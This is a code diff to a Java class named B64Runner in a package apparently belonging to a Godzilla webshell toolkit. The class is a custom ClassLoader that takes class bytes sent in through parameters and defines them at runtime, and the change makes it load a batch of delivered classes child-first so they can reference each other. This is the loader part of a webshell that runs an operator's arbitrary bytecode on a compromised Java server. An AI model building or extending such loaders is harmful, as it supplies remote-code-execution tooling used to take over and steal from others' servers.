@@ -3,6 +3,7 @@ package com.reajason.javaweb.godzilla;
 import java.io.ByteArrayInputStream;
 import java.io.DataInputStream;
 import java.lang.reflect.Field;
+import java.util.HashMap;
 import java.util.Map;
 
 /**
@@ -29,6 +30,8 @@ public class B64Runner extends ClassLoader {
     private static final String PARAM_MAIN = "p2";
     private static final String PARAM_MAIN_NAME = "p3";
     private static final String PARAM_RESULT = "result";
+
+    private final Map<String, byte[]> innerClasses = new HashMap<String, byte[]>();
 
     public B64Runner() {
         super(contextClassLoader());
@@ -99,8 +102,38 @@ public class B64Runner extends ClassLoader {
             int classLength = in.readInt();
             byte[] classBytes = new byte[classLength];
             in.readFully(classBytes);
-            defineClass(new String(nameBytes, "UTF-8"), classBytes, 0, classBytes.length);
+            innerClasses.put(new String(nameBytes, "UTF-8"), classBytes);
         }
+        for (String className : innerClasses.keySet()) {
+            loadClass(className);
+        }
+    }
+
+    // 下发类之间可互相引用；仅对这批类子优先解析，避免父加载器先绑定后再重复定义。
+    @Override
+    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
+        if (!innerClasses.containsKey(name)) {
+            return super.loadClass(name, resolve);
+        }
+        synchronized (getClassLoadingLock(name)) {
+            Class<?> type = findLoadedClass(name);
+            if (type == null) {
+                type = findClass(name);
+            }
+            if (resolve) {
+                resolveClass(type);
+            }
+            return type;
+        }
+    }
+
+    @Override
+    protected Class<?> findClass(String name) throws ClassNotFoundException {
+        byte[] bytes = innerClasses.get(name);
+        if (bytes == null) {
+            throw new ClassNotFoundException(name);
+        }
+        return defineClass(name, bytes, 0, bytes.length);
     }
 
     /**
